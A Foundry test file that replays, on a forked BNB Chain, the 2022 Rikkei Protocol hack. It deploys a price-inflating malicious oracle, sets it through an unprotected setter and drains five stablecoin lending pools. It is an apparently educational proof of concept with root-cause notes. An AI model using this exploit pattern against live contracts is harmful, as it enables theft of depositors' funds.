// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../TestHarness.sol";
import {IRToken} from '../interfaces/IRToken.sol';
import {IERC20} from '../interfaces/IERC20.sol';
import {IWETH9} from '../interfaces/IWETH9.sol';

import {IPancakeRouter01} from '../utils/IPancakeRouter01.sol';
import {TokenBalanceTracker} from '../modules/TokenBalanceTracker.sol';

// forge test --match-contract Exploit_Rikkei -vvv
/*
On Apr 15, 2022 an attacker stole ~1MM USD in BNB tokens from Rikkei Protocol.
The attacker called a non access controlled oracle setter, setting a malicious oracle to manipulate the price draining several 
stablecoin pools.

// Attack Overview
Total Lost: 
Attack Tx: https://bscscan.com/tx/0x93a9b022df260f1953420cd3e18789e7d1e095459e36fe2eb534918ed1687492
Ethereum Transaction Viewer: https://tx.eth.samczsun.com/binance/0x93a9b022df260f1953420cd3e18789e7d1e095459e36fe2eb534918ed1687492

Exploited Contract: 
Attacker Address: https://bscscan.com/address/0x803e0930357ba577dc414b552402f71656c093ab
Attacker Contract: https://bscscan.com/address/0xe6DF12a9f33605F2271D2a2DdC92E509E54E6b5F
Attacker Oracle: https://bscscan.com/address/0xA36F6F78B2170a29359C74cEFcB8751E452116f9#code
Attack Block:  16956475

// Key Info Sources
Writeup: https://knownseclab.com/news/625e865cf1c544005a4bdaf2 


Principle: Access Control / Oracle Manipulation

    function setOracleData(address rToken, oracleChainlink _oracle) external {
        oracleData[rToken] = _oracle;
    }


ATTACK:
This non access controlled function allows anyone to set the address of the new oracle. The attacker changed the current oracle
for a malicious implementation that returned a manipulated value allowing the attacker to drain each pair.

MITIGATIONS:
1) Access control the oracle setting functions.
*/

interface IUnitroller {
    function enterMarkets(address[] memory cTokens) external payable returns(uint256[] memory);
    function exitMarket(address market) external;

    // Borrow caps enforced by borrowAllowed for each cToken address. Defaults to zero which corresponds to unlimited borrowing.
    function borrowCaps(address market) external view returns(uint256);
}

interface ChainLinkOracle {
    function decimals() external view returns (uint8);
    function latestRoundData()
    external
    view
    returns (
        uint80 roundId,
        int256 answer,
        uint256 startedAt,
        uint256 updatedAt,
        uint80 answeredInRound
    );
}
interface ISimpleOraclePrice{
    function setOracleData(address rToken, ChainLinkOracle _oracle) external;
}

contract Exploit_Rikkei is TestHarness, TokenBalanceTracker {
    // List of IRTokens stolen
    IRToken internal rBNB = IRToken(0x157822aC5fa0Efe98daa4b0A55450f4a182C10cA);

    IRToken[5] internal rTokens = [
        IRToken(0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5), // rUSDC
        IRToken(0x53aBF990bF7A37FaA783A75FDD75bbcF8bdF11eB), // rBTC
        IRToken(0x9B9006cb01B1F664Ac25137D3a3a20b37d8bC078), // rDAI
        IRToken(0x383598668C025Be0798E90E7c5485Ff18D311063), // rUSDT
        IRToken(0x6db6A55E57AC8c90477bBF00ce874B988666553A)  // rBUSD
    ];

    IWETH9 internal wbnb = IWETH9(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    IERC20[5] internal tokens = [
        IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d), // USDC
        IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c), // BTCB
        IERC20(0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3), // DAI
        IERC20(0x55d398326f99059fF775485246999027B3197955), // BUSDT
        IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56)  // BUSD
    ];

    address internal attackerContract = 0xe6DF12a9f33605F2271D2a2DdC92E509E54E6b5F;

    IPancakeRouter01 internal router = IPancakeRouter01(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IUnitroller internal unitroller = IUnitroller(0x4f3e801Bd57dC3D641E72f2774280b21d31F64e4);
    ISimpleOraclePrice internal priceOracle = ISimpleOraclePrice(0xD55f01B4B51B7F48912cD8Ca3CDD8070A1a9DBa5);

    function setUp() external {
        cheat.createSelectFork('bsc', 16956473); // We pin one block before the exploit happened.

        // The attacker contract started with some BNBs.
        cheat.deal(address(this), attackerContract.balance);

        for(uint256 i = 0; i < tokens.length; i++){
            addTokenToTracker(address(tokens[i]));
        }

        addTokenToTracker(address(rBNB));
        updateBalanceTracker(address(this));
    }

    receive() external payable {}

    function test_attack() external {
        console.log('------- STEP 0: INITIAL BALANCE -------');
        console.log('Attacker');
        logBalances(address(this));

        console.log('------- STEP 1: DEPLOY MALICIOUS ORACLE -------');
        address maliciousOracle = deployMaliciousOracle(0);
        console.log('Oracle Deployed at:', maliciousOracle);
        console.log('\n');

        console.log('------- STEP 1: MINT rBNB -------');
        rBNB.mint{value: 0.0001 ether}(); // in BNB
        logBalances(address(this));
        console.log('\n');

        console.log('------- STEP 2: ENTER MARKET -------');
        rBNB.approve(address(unitroller), type(uint256).max);
        console.log('\n');


        address[] memory uTokens = new address[](1);
        uTokens[0] = address(rBNB);
        unitroller.enterMarkets(uTokens);

        console.log('------- STEP 3: ASSIGN MALICIOUS ORACLE -------'); // REKT
        priceOracle.setOracleData(address(rBNB), ChainLinkOracle(maliciousOracle));
        console.log('\n');

        console.log('------- STEP 4: LOOP OVER ALL STABLES AND DRAIN EACH POOL -------'); // REKT V2
        for(uint i = 0; i < 5; i++){
            IRToken curRToken = rTokens[i];
            IERC20 curToken = tokens[i];
            
            console.log("------- STEP 4.%s.1: BORROWING ON %s POOL -------", i+1, curRToken.name());
            
            uint256 poolBalance = curRToken.getCash();
            curRToken.borrow(poolBalance);
            curToken.approve(address(router), type(uint256).max);
            
            console.log('Attacker Balance');
            logBalances(address(this));

            console.log("------- STEP 4.%s.2: SWAPPING %s FOR NATIVE TOKENS -------", i+1, curToken.name());

            address[] memory _path = new address[](2);
            _path[0] = address(curToken);
            _path[1] = address(wbnb);

            router.swapExactTokensForETH(curToken.balanceOf(address(this)), 1, _path, address(this), 1649992719);
            console.log('Attacker Balance');
            logBalances(address(this));

            console.log('\n');
        }

        console.log('------- STEP 5: ATTACKER BALANCES AFTER SWAPS -------');
        logBalances(address(this));

        console.log('------- STEP 6: SETS THE ORACLE BACK -------'); 
        // sets the BNB/USD oracle back again
        priceOracle.setOracleData(address(rBNB), ChainLinkOracle(0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE));
    }

    function deployMaliciousOracle(uint256 _salt) internal returns(address newOracleDeployed){
        newOracleDeployed = address(new MaliciousOracle{salt: bytes32(_salt)}());
    }
}


contract MaliciousOracle is ChainLinkOracle{
    ChainLinkOracle bnbUSDOracle = ChainLinkOracle(0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE);
    function decimals() external view returns (uint8){
        return bnbUSDOracle.decimals();
    }

    // We compared the return of the malicious oracle and Chainlinks and there is an offset of 22 zeros.
    // Malicious Oracle: 0xA36F6F78B2170a29359C74cEFcB8751E452116f9
    // Malicious Oracle Return: 416881147930000000000000000000000
    // Chainlink Oracle Return: 41624753868
    function latestRoundData()
    external
    view
    returns (
        uint80 roundId,
        int256 answer,
        uint256 startedAt,
        uint256 updatedAt,
        uint80 answeredInRound
    ){
        (roundId,
         answer,
         startedAt,
         updatedAt,
         answeredInRound) = bnbUSDOracle.latestRoundData();
         answer = answer * 1e22; 
         updatedAt = block.timestamp;
    }

}